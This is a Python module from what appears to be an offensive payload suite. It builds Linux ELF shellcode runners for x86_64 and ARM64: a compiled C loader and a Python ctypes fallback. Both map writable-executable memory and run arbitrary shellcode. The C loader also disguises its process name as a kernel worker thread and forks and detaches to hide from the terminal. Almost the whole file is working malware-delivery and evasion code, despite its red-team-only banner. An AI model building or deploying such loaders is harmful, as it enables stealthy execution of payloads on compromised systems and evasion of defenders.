"""ELF (Linux/ARM) shellcode runner builder.

Builds a C source ELF loader or uses the Python mmap exec approach.

Two modes:
    1. C source + gcc compilation (preferred — produces real ELF)
    2. Python mmap fallback (for environments without gcc)

Features:
    - mmap + mprotect PROT_EXEC approach
    - Prctl(PR_SET_NAME) masquerading
    - Fork-and-exec to detach from terminal
    - ARM64 and x86_64 support

FOR AUTHORIZED PENETRATION TESTING AND RED TEAM OPERATIONS ONLY.
"""
from __future__ import annotations

import os
import subprocess
import tempfile
from typing import TYPE_CHECKING

if TYPE_CHECKING:
    from forge_payload.payload_factory import PayloadConfig


_ELF_LOADER_C = r"""
/*
 * Forge Suite v5 APEX — ELF Shellcode Runner
 * FOR AUTHORIZED RED TEAM OPERATIONS ONLY
 *
 * Compile: gcc -O2 -o runner runner.c
 * ARM64:   aarch64-linux-gnu-gcc -O2 -o runner runner.c
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/prctl.h>
#include <unistd.h>

unsigned char sc[] = {SHELLCODE_PLACEHOLDER};
unsigned int sc_len = sizeof(sc);

int main(int argc, char **argv) {
    // Masquerade as a system process
    prctl(PR_SET_NAME, "[kworker/0:0]", 0, 0, 0);

    // Fork and detach
    pid_t pid = fork();
    if (pid < 0) return 1;
    if (pid > 0) return 0;  // Parent exits

    setsid();

    // Allocate RWX memory via mmap
    void *mem = mmap(NULL, sc_len,
                     PROT_READ | PROT_WRITE | PROT_EXEC,
                     MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
    if (mem == MAP_FAILED) _exit(1);

    memcpy(mem, sc, sc_len);

    // Execute shellcode
    ((void (*)(void))mem)();

    munmap(mem, sc_len);
    return 0;
}
"""

_ELF_LOADER_PYTHON = """\
#!/usr/bin/env python3
# Forge Suite v5 APEX — ELF Python Shellcode Loader
# FOR AUTHORIZED RED TEAM OPERATIONS ONLY
import ctypes
import ctypes.util
import os
import struct
import sys

sc = {shellcode_bytes}

def run():
    libc = ctypes.CDLL(ctypes.util.find_library("c"), use_errno=True)
    PROT = 7   # PROT_READ | PROT_WRITE | PROT_EXEC
    MAP_FLAGS = 0x22  # MAP_ANONYMOUS | MAP_PRIVATE
    mem = libc.mmap(0, len(sc), PROT, MAP_FLAGS, -1, 0)
    if mem == -1:
        sys.exit(1)
    buf = (ctypes.c_char * len(sc)).from_address(mem)
    buf[:] = bytes(sc)
    fn = ctypes.CFUNCTYPE(None)(mem)
    os.fork() == 0 and fn()

run()
"""


def build_elf(payload_bytes: bytes, config: "PayloadConfig") -> bytes:
    """Build an ELF shellcode runner.

    Tries gcc compilation first; falls back to Python loader.

    Args:
        payload_bytes: Raw shellcode bytes.
        config:        PayloadConfig.

    Returns:
        ELF binary bytes, or Python script bytes as fallback.
    """
    sc_hex = ", ".join(f"0x{b:02x}" for b in payload_bytes)
    c_source = _ELF_LOADER_C.replace("{SHELLCODE_PLACEHOLDER}", sc_hex)

    compiled = _try_compile_elf(c_source, config)
    if compiled:
        return compiled

    # Python fallback
    sc_repr = repr(list(payload_bytes))
    python_loader = _ELF_LOADER_PYTHON.format(shellcode_bytes=sc_repr)
    return python_loader.encode()


def _try_compile_elf(c_source: str, config: "PayloadConfig") -> bytes | None:
    """Attempt to compile C source with gcc/cross-compiler."""
    if config.arch.value == "arm64":
        compiler = "aarch64-linux-gnu-gcc"
    else:
        compiler = "gcc"

    try:
        result = subprocess.run(["which", compiler], capture_output=True, timeout=5)
        if result.returncode != 0:
            return None
    except Exception:
        return None

    with tempfile.TemporaryDirectory() as tmpdir:
        src_path = os.path.join(tmpdir, "runner.c")
        out_path = os.path.join(tmpdir, "runner.elf")

        with open(src_path, "w") as f:
            f.write(c_source)

        try:
            result = subprocess.run(
                [compiler, "-O2", "-o", out_path, src_path],
                capture_output=True,
                timeout=30,
            )
            if result.returncode == 0 and os.path.exists(out_path):
                with open(out_path, "rb") as f:
                    return f.read()
        except Exception:
            pass

    return None
